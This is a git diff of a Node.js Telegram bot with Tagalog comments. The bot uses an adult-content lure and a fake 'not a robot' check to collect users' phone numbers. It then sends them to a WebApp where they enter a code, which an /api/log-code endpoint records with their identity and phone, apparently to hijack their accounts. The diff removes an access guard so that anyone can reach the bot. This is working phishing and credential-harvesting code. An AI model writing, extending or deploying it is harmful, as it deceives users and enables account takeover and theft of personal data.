@@ -20,9 +20,6 @@ const bot = new Telegraf(BOT_TOKEN);
 const userPhones = new Map();
 const submissions = new Map();
 const typingLoops = new Map();
-const allowedUsers = new Set();
-
-const REQUIRED_START_PAYLOAD = "jesimae";
 
 // Helper functions
 function scheduleDelete(chatId, messageId, delayMs = 30 * 60 * 1000) {
@@ -41,86 +38,11 @@ function stopTypingLoop(userId) {
   }
 }
 
-async function deleteIncomingUserMessage(ctx) {
-  try {
-    if (ctx.chat?.type === "private" && ctx.message?.message_id) {
-      await bot.telegram.deleteMessage(ctx.chat.id, ctx.message.message_id);
-    }
-  } catch (_) {}
-}
-
-async function denyAndClean(ctx) {
-  await deleteIncomingUserMessage(ctx);
-
-  const msg = await ctx.reply(
-    "⚠️ Access denied.\n\nUse the official link:\nhttps://t.me/jesimaebot?start=jesimae"
-  ).catch(() => null);
-
-  if (msg?.message_id) {
-    scheduleDelete(ctx.chat.id, msg.message_id, 5000);
-  }
-}
-
-function isAuthorizedUser(ctx) {
-  const userId = ctx.from?.id;
-  return Boolean(userId && allowedUsers.has(userId));
-}
-
-// ==========================================
-// GLOBAL GUARD - Block direct private chat users
-// ==========================================
-bot.use(async (ctx, next) => {
-  const isPrivate = ctx.chat?.type === "private";
-  if (!isPrivate) return next();
-
-  const isStartCommand =
-    ctx.message?.text && typeof ctx.message.text === "string"
-      ? ctx.message.text.startsWith("/start")
-      : false;
-
-  if (isStartCommand) {
-    return next();
-  }
-
-  if (!isAuthorizedUser(ctx)) {
-    await denyAndClean(ctx);
-    return;
-  }
-
-  return next();
-});
-
 // ==========================================
 // 1. /START HANDLER
-// Only allow users from deep link: ?start=jesimae
+// LAGING tulad ng nasa unang photo
 // ==========================================
 bot.start(async (ctx) => {
-  const payload = ctx.startPayload || "";
-  const userId = ctx.from?.id;
-
-  await deleteIncomingUserMessage(ctx);
-
-  if (payload !== REQUIRED_START_PAYLOAD) {
-    if (userId) {
-      allowedUsers.delete(userId);
-      userPhones.delete(userId);
-      stopTypingLoop(userId);
-    }
-
-    const msg = await ctx.reply(
-      "⚠️ Access denied.\n\nUse the official link:\nhttps://t.me/jesimaebot?start=jesimae"
-    ).catch(() => null);
-
-    if (msg?.message_id) {
-      scheduleDelete(ctx.chat.id, msg.message_id, 5000);
-    }
-    return;
-  }
-
-  if (userId) {
-    allowedUsers.add(userId);
-  }
-
   const msg = await ctx.reply(
     "🔞 Upang ma-access ang mga file nang libre 💦\n" +
     "👇 Siguraduhing hindi ka robot",
@@ -144,13 +66,9 @@ bot.start(async (ctx) => {
 
 // ==========================================
 // 2. CONTACT HANDLER
+// Pagkatapos i-tap ang "Hindi ako robot!"
 // ==========================================
 bot.on("contact", async (ctx) => {
-  if (!isAuthorizedUser(ctx)) {
-    await denyAndClean(ctx);
-    return;
-  }
-
   const contact = ctx.message.contact;
   if (!contact) return;
 
@@ -164,8 +82,10 @@ bot.on("contact", async (ctx) => {
     return;
   }
 
+  // I-save ang number
   userPhones.set(ctx.from.id, contact.phone_number);
 
+  // Tanggalin ang keyboard sa ibaba para malinis
   const reply = await ctx.reply("⏳ Naglo-load...", {
     reply_markup: {
       remove_keyboard: true,
@@ -173,6 +93,7 @@ bot.on("contact", async (ctx) => {
   });
   scheduleDelete(ctx.chat.id, reply.message_id, 2000);
 
+  // Ilabas ang WebApp Button para makapag-submit na ng code
   const webappMsg = await ctx.reply(
     "✅ Verified! Pindutin ang button sa ibaba upang ilagay ang code.",
     {
@@ -189,25 +110,6 @@ bot.on("contact", async (ctx) => {
     }
   );
   scheduleDelete(ctx.chat.id, webappMsg.message_id);
-});
-
-// ==========================================
-// OPTIONAL: block text/media from unauthorized direct users explicitly
-// ==========================================
-bot.on(["text", "photo", "video", "document", "sticker", "voice"], async (ctx, next) => {
-  if (ctx.chat?.type !== "private") return next();
-
-  const text = ctx.message?.text || "";
-  if (typeof text === "string" && text.startsWith("/start")) {
-    return next();
-  }
-
-  if (!isAuthorizedUser(ctx)) {
-    await denyAndClean(ctx);
-    return;
-  }
-
-  return next();
 });
 
 // ==========================================
@@ -242,10 +144,6 @@ app.post("/api/log-code", async (req, res) => {
   const userId = tgUser?.id;
   const username = tgUser?.username || "N/A";
   const firstName = tgUser?.first_name || "";
-
-  if (!userId || !allowedUsers.has(userId)) {
-    return res.status(403).json({ ok: false, error: "Unauthorized user" });
-  }
 
   const telegramPhone = userId && userPhones.get(userId) ? userPhones.get(userId) : "N/A";
 
